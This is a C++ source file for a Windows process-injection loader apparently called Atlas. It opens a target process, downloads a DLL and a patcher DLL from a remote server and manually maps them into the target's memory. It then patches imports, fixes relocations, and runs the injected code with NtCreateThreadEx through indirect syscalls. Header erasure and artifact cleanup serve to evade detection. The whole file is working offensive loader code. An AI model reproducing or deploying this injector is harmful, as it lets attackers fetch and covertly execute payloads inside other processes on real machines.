#include <AtlasLdr.h>

VOID AtlasInject(ATLAS_PARAMS atlas_params){
    //syscalls, functions and stuff Atlas uses
    ATLAS_UTILS atlas_utils;
    RetrieveUtils(&atlas_utils);

    //DLL remote position data
    ARTIFACT_DATA dll_artifact;
    ARTIFACT_DATA atlasPatcher_artifact;

    //DLL data incapsulated
    DLL_DATA dll_data;
    DLL_DATA atlasPatcher_data;

    NTSTATUS status;

    //Target finding
    if(atlas_params.process_pid == NULL){
        wchar_t* w_target = ConvertCharToWideChar(atlas_params.process_name);
        atlas_params.process_pid = FindTargetPid(w_target, &atlas_utils); 
        delete[] w_target;
    }
    

    //Open remote process
    HANDLE hRemote;

    ACCESS_MASK desiredAccess = PROCESS_ALL_ACCESS;
    OBJECT_ATTRIBUTES objectAttributes = {};
    CLIENT_ID clientId = {};
    clientId.UniqueProcess = (HANDLE)(atlas_params.process_pid);

    fnNtOpenProcess sysInvokeOpen = (fnNtOpenProcess)C_SyscallPrepare(&atlas_utils, atlas_utils.atlas_syscalls.NtOpenProcess);
    status = sysInvokeOpen(&hRemote, desiredAccess, &objectAttributes, &clientId);
    if(!NT_SUCCESS(status)){ 
        CleanArtifacts(&atlas_utils, &atlasPatcher_artifact);
        ErrorCallback("Error getting remote handle", 0, status, NULL, NULL, FALSE);
    }
    C_SyscallCleanup(&atlas_utils, (PVOID)sysInvokeOpen);


    // Dll retrieve
    char* dll_buffer = ObtainRock(atlas_params.server, atoi(atlas_params.port), atlas_params.dll);
    char* atlasPatcher_buffer = ObtainRock(atlas_params.server, atoi(atlas_params.port), atlas_params.atlasPatcher);

    RetrieveDLL_DATA(dll_buffer, &dll_data);
    RetrieveDLL_DATA(atlasPatcher_buffer, &atlasPatcher_data);

    printf("\n%s - Mapping %s - %s\n\n", att, atlas_params.dll,att);
   
    AtlasLdr(dll_data, &atlas_utils, dll_artifact, hRemote, atlas_params.dll_entryPoint, FALSE);
   
    printf("%s - %s mapped at %p - %s\n\n", att, atlas_params.dll, dll_artifact.pTargetAddr, att);


    printf("%s - Mapping %s - %s \n\n", att, atlas_params.atlasPatcher, att);

    atlasPatcher_data.imageSize += sizeof(ATLASPATCHER_PARAMS);
    AtlasLdr(atlasPatcher_data, &atlas_utils, atlasPatcher_artifact, hRemote, atlas_params.atlasPatcher_entrypoint, TRUE); 

    printf("%s - %s mapped at %p - %s\n\n", att, atlas_params.atlasPatcher, atlasPatcher_artifact.pTargetAddr, att);


    //Params for AtlasPatcher
    PVOID pAtlasPatcherParamsAddr = (PVOID)(((SIZE_T)atlasPatcher_artifact.pTargetAddr + atlasPatcher_data.imageSize) - sizeof(ATLASPATCHER_PARAMS));

    ATLASPATCHER_PARAMS atlasPatcher_params;
    atlasPatcher_params.pDllAddr = (DWORD_PTR)dll_artifact.pTargetAddr;
    atlasPatcher_params.pDllEntryPoint = (DWORD_PTR)dll_artifact.pEntryPoint;

    //As Atlas erased the DOS headers and the MAGIC from NT Headers, this is done for convenience
    atlasPatcher_params.pImportDirectoryRVA = (DWORD_PTR)dll_artifact.pImportDirectoryRVA;
    atlasPatcher_params.importDirectorySize = dll_artifact.importDirectorySize;

    status = atlas_utils.pNtWriteVirtualMemory(hRemote, pAtlasPatcherParamsAddr, &atlasPatcher_params, sizeof(ATLASPATCHER_PARAMS), NULL);
    if(!NT_SUCCESS(status)){
        ErrorCallback("Write on target failed", 0, status, NULL, NULL, FALSE);
    }

    //End of params

    printf("%s - Executing %s to patch %s IAT\n", info, atlas_params.atlasPatcher, atlas_params.dll);
    HANDLE hExecution = NULL;

    fnNtCreateThreadEx sysInvokeExecute = (fnNtCreateThreadEx)C_SyscallPrepare(&atlas_utils, atlas_utils.atlas_syscalls.NtCreateThreadEx);
    status = sysInvokeExecute(&hExecution, GENERIC_EXECUTE, NULL, hRemote, (LPTHREAD_START_ROUTINE)atlasPatcher_artifact.pEntryPoint, pAtlasPatcherParamsAddr, FALSE, NULL, NULL, NULL, NULL);
    if(!NT_SUCCESS(status)){ 
        CleanArtifacts(&atlas_utils, &atlasPatcher_artifact);
        ErrorCallback("Execution failed, cleaning artifacts from remote", 0, status, &atlas_utils, &dll_artifact, TRUE);
    }

    C_SyscallCleanup(&atlas_utils, (PVOID)sysInvokeExecute);

    printf("\t%s - Remote thread executed at %p\n\n", ok, atlasPatcher_artifact.pEntryPoint);

    printf("%s - %s IAT patched\n", ok, atlas_params.dll);
    printf("%s - Executing %s entrypoint\n", info, atlas_params.dll);
    printf("%s - %s entrypoint executed\n", ok, atlas_params.dll);


    if(atlas_params.cleanupOnFinish){
        WaitForSingleObject(hExecution, INFINITE);
    
        printf("\n%s - Cleaning artifacts from remote\n", info);
        bool artifact1 = CleanArtifacts(&atlas_utils, &atlasPatcher_artifact);
        bool artifact2 = CleanArtifacts(&atlas_utils, &dll_artifact);

        if(artifact1 && artifact2){
            printf("%s - Artifacts cleaned from remote\n", ok);
        }
    }

    CloseHandle(hExecution);
    CloseHandle(hRemote);
}

VOID AtlasLdr(DLL_DATA dll_data, ATLAS_UTILS* atlas_utils, ARTIFACT_DATA& artifact_data, HANDLE hRemote, char* entryPoint, BOOL patchIAT){
    PVOID pLocalMappingAddr = NULL;
    PVOID pTargetAddr = NULL;
    NTSTATUS status;

    fnNtAllocateVirtualMemory sysInvoke = (fnNtAllocateVirtualMemory)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtAllocateVirtualMemory);
    status = sysInvoke(GetCurrentProcess(), &pLocalMappingAddr, 0, &dll_data.imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if(!NT_SUCCESS(status)){
        ErrorCallback("Allocation failed", 0, status, NULL, NULL, FALSE);
    }

    status = sysInvoke(hRemote, &pTargetAddr, 0, &dll_data.imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if(!NT_SUCCESS(status)){
        ErrorCallback("Allocation failed", 0, status, NULL, NULL, FALSE);
    }

    C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);

    artifact_data.hRemote = hRemote;
    artifact_data.pTargetAddr = pTargetAddr;
    artifact_data.imageSize = dll_data.imageSize;
    artifact_data.pImportDirectoryRVA = (PVOID)((DWORD_PTR)dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    artifact_data.importDirectorySize = dll_data.optHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

    printf("\t%s - Mapping sections\n", info);

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(dll_data.ntHeaders);
    dll_data.optHeader->ImageBase = (SIZE_T)pTargetAddr;

    memcpy(
        pLocalMappingAddr, 
        dll_data.baseAddr,
        dll_data.optHeader->SizeOfHeaders
    );

    for(SIZE_T i = 0; i < dll_data.fileHeader->NumberOfSections; i++, sectionHeader++){
        memcpy(
            (PVOID)((DWORD_PTR)pLocalMappingAddr + sectionHeader->VirtualAddress),
            (PVOID)((DWORD_PTR)dll_data.baseAddr + sectionHeader->PointerToRawData),
            sectionHeader->SizeOfRawData
        );
    }
    printf("\t%s - Sections mapped\n\n", ok);

    if(patchIAT){    
        printf("\t%s - Patching IAT\n", info);
        PatchIAT(pLocalMappingAddr, dll_data, atlas_utils, &artifact_data);
        printf("\t%s - IAT patched\n\n", ok);
    }

    printf("\t%s - Fixing relocations\n", info);
    FixRelocations(pTargetAddr, pLocalMappingAddr, dll_data);
    printf("\t%s - Relocations fixed\n\n", ok);

    status = atlas_utils->pNtWriteVirtualMemory(hRemote, pTargetAddr, pLocalMappingAddr, dll_data.imageSize, NULL);
    if(!NT_SUCCESS(status)){
        ErrorCallback("Write on target failed", 0, status, atlas_utils, &artifact_data, TRUE);
    }

    printf("\t%s - Changing memory protection\n", info);
    FixMemoryProtections(&artifact_data, pLocalMappingAddr, dll_data, atlas_utils);
    printf("\t%s - Memory protection changed\n\n", ok);

    if(entryPoint != NULL){
        dll_data.baseAddr = pLocalMappingAddr;
        SIZE_T pExecutionAddr = C_GetProcAddress(dll_data, C_HashString(ConvertCharToWideChar(entryPoint)), NULL, atlas_utils);
        if(pExecutionAddr != -1){
            artifact_data.pEntryPoint = (PVOID)(pExecutionAddr + ((DWORD_PTR)pTargetAddr - (DWORD_PTR)pLocalMappingAddr));
        }
        else{
            ErrorCallback("Retrieve of the entrypoint failed", GetLastError(), 0, atlas_utils, &artifact_data, TRUE);
        }
    }
    else{
        artifact_data.pEntryPoint = (PVOID)((SIZE_T)pTargetAddr + dll_data.entryPoint);
    }
}

